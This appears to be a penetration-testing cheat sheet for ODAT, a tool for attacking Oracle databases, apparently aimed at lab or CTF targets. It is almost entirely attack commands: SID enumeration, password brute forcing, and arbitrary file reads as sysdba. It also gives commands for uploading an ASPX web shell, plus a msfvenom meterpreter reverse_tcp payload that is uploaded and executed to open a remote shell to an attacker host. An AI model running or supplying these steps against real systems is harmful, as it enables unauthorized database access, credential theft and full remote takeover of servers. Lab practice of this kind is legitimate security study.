ODAT (Oracle Database Attacking Tool)

Download ODAT

# Install
sudo apt install odat

# Check
odat --version

Enum

# SID enum (You only need one)
odat sidguesser -s 10.10.11.10

# User/Password brute force
odat passwordguesser -s 10.10.11.10 -d SID --accounts-file accounts.txt

# Run all checks with creds as sysdba
odat all -s 10.10.11.10 -U username -P password -d SID --sysdba

General

# Export everytime or add to ~/.zshrc
export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}

# Connect
sqlplus uesr/password@10.10.11.10:1521/SID

# Connect as sysdba (sudo)
sqlplus uesr/password@10.10.11.10:1521/SID as sysdba

# Check privilege
select * from user_role_privs;

Privesc

Arbitrary Read

odat ctxsys -s 10.10.11.10 -U username -P password -d SID --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt

Upload File to RCE

odat dbmsadvisor -s 10.10.11.10 -U username -P password -d SID --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx

Execute binary to RCE

# Create a malicious exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o revshell.exe

# Upload
odat utlfile -s 10.10.11.10 -U username -P password -d SID --sysdba --putFile \\Temp revshell.exe revshell.exe

# Execute
odat externaltable -s 10.10.11.10 -U username -P password -d SID --sysdba --exec \\Temp revshell.exe
